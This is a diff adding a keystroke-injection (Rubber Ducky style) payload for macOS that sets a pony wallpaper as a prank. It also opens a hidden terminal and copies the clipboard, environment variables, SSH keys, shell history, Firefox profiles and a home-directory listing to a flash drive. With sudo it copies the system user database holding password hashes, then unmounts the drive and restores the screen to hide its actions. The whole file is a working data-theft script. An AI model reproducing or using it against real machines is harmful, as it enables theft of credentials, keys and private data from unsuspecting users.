@@ -1,0 +1,79 @@
+REM Author: Jippen
+REM Description: Set pony wallpaper AND steal data
+DELAY 500
+
+REM Open a terminal
+GUI SPACE
+DELAY 1000
+STRING terminal
+DELAY 100
+ENTER
+DELAY 1000
+
+REM Shrink the terminal
+GUI -
+GUI -
+GUI -
+GUI -
+GUI -
+GUI -
+GUI -
+GUI -
+GUI -
+GUI -
+
+REM Ensure we have a clear command line
+GUI C
+
+REM Preserve sudo
+STRING  sudo -v
+ENTER
+DELAY 100
+STRING a
+CONTROL C
+
+REM Write background image file
+STRING  sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '/Volumes/JUNPDRIVE/mlp.jpg'" && killall Dock  
+ENTER
+
+REM Set shortcut env variables
+STRING  export O="/Volumes/JUNPDRIVE/.$(system_profiler SPHardwareDataType|fgrep Serial|cut -d : -f 2|cut -d ' ' -f 2)"
+ENTER
+
+REM Steal Data
+STRING  mkdir -p ${O}/h ${O}/ff;pbpaste >> ${O}/clipboard;env >> ${O}/env;cp -R ~/.ssh ${O}/;cp .bash_* $O/;cp -R ~/Library/Application\ Support/Firefox/Profiles ${O}/ff;find ~ -not -path '*/\.*'|python -c "import sys as s;s.a=[];[setattr(s,'a',list(filter(lambda p: c.startswith(p+'/'),s.a)))or (s.stdout.write(' '*len(s.a)+c[len(s.a[-1])+1 if s.a else 0:])or True) and s.a.append(c[:-1]) for c in s.stdin]" > ~/ $O/homedir 
+ENTER
+
+DELAY 1000
+
+REM Steal privilged data
+STRING  sudo cp -R /var/db/dslocal/nodes/Default/users/ $O/h/ 
+ENTER
+DELAY 100
+STRING a
+CONTROL C
+
+REM Unmount flash drive
+STRING  reset
+ENTER 
+STRING  sync;diskutil unmountDisk /Volumes/JUNPDRIVE/
+ENTER
+
+REM Restore the terminal
+STRING  reset
+ENTER 
+GUI +
+GUI +
+GUI +
+GUI +
+GUI +
+GUI +
+GUI +
+GUI +
+GUI +
+GUI +
+
+DELAY 3000
+
+REM Exit the terminal
+GUI Q
